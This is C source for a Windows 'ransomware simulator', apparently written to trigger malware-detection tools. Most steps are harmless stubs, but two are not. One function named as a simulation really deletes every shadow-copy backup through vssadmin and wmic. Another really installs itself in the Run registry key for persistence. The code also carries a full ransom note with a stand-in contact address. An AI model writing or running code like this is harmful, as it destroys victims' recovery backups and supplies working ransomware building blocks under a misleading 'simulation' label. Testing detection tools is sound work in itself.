#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "kernel32.lib")

void SimulateFileEncryption() {
    printf("[Ransomware] Simulating file encryption...\n");
    
    HCRYPTPROV hProv = 0;
    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    
    if (hProv) {
        HCRYPTKEY hKey = 0;
        CryptGenKey(hProv, CALG_AES_256, CRYPT_EXPORTABLE, &hKey);
        
        if (hKey) {
            BYTE data[1024] = {0};
            DWORD dataLen = sizeof(data);
            CryptEncrypt(hKey, 0, TRUE, 0, data, &dataLen, sizeof(data));
            
            DWORD keyLen = 0;
            CryptExportKey(hKey, 0, SIMPLEBLOB, 0, NULL, &keyLen);
            
            BYTE* keyData = (BYTE*)malloc(keyLen);
            if (keyData) {
                CryptExportKey(hKey, 0, SIMPLEBLOB, 0, keyData, &keyLen);
                printf("[Ransomware] Encryption key exported (%d bytes)\n", keyLen);
                free(keyData);
            }
            CryptDestroyKey(hKey);
        }
        CryptReleaseContext(hProv, 0);
    }
}

void SimulateShadowCopyDeletion() {
    printf("[Ransomware] Simulating shadow copy deletion...\n");
    system("vssadmin delete shadows /all /quiet");
    system("wmic shadowcopy delete");
}

void SimulateFileDeletion() {
    printf("[Ransomware] Simulating file deletion using DeleteFileW...\n");
    DeleteFileW(L"dummy_file_to_delete.txt");
}

void SimulateRansomNoteDisplay() {
    printf("[Ransomware] Simulating ransom note display...\n");
    
    const wchar_t* ransomNote = 
        L"YOUR FILES HAVE BEEN ENCRYPTED!\n"
        L"To restore your files, you need to purchase a decryption key.\n"
        L"Price: 1000 USD in Bitcoin\n"
        L"Payment address: bc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n"
        L"Contact: ransom@evil-domain.com\n";
    
    MessageBoxW(NULL, ransomNote, L"Encryption Complete", MB_OK | MB_ICONWARNING);
}

void SimulateFileExtensionChange() {
    printf("[Ransomware] Simulating file extension changes...\n");
    const char* newExtension = ".encrypted";
    const char* targetFiles[] = {
        "document.docx",
        "photo.jpg",
        "database.sql",
        "archive.zip",
        NULL
    };
    
    for (int i = 0; targetFiles[i]; i++) {
        printf("[Ransomware] Encrypting: %s -> %s%s\n", targetFiles[i], targetFiles[i], newExtension);
    }
}

void SimulateRegistryModification() {
    printf("[Ransomware] Simulating registry modifications...\n");
    HKEY hKey;
    RegCreateKeyExW(HKEY_CURRENT_USER, 
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    
    if (hKey) {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        RegSetValueExW(hKey, L"Ransomware", 0, REG_SZ, 
            (BYTE*)exePath, (wcslen(exePath) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

int main() {
    printf("Generic Ransomware Simulator - Demonstrating ransomware PE characteristics\n");
    printf("Features: CryptEncrypt, CryptExportKey, DeleteFileW\n\n");
    
    const char* maliciousStrings[] = {
        "AES_ENCRYPT",
        "RANSOM_DECRYPT",
        "BITCOIN",
        "ENCRYPTED_FILE",
        "DECRYPTION_KEY",
        "PAYMENT",
        "CONTACT_EMAIL",
        "SHADOW_COPY_DELETE",
        NULL
    };
    
    for (int i = 0; maliciousStrings[i]; i++) {
        printf("[Ransomware] String present: %s\n", maliciousStrings[i]);
    }
    
    SimulateShadowCopyDeletion();
    SimulateFileEncryption();
    SimulateFileDeletion();
    SimulateFileExtensionChange();
    SimulateRegistryModification();
    SimulateRansomNoteDisplay();
    
    printf("\nWaiting for detection (30 seconds)...\n");
    for (int i = 0; i < 30; i++) {
        printf("  Waiting %d/30...\r", i+1);
        fflush(stdout);
        Sleep(1000);
    }
    printf("\n");
    
    return 0;
}
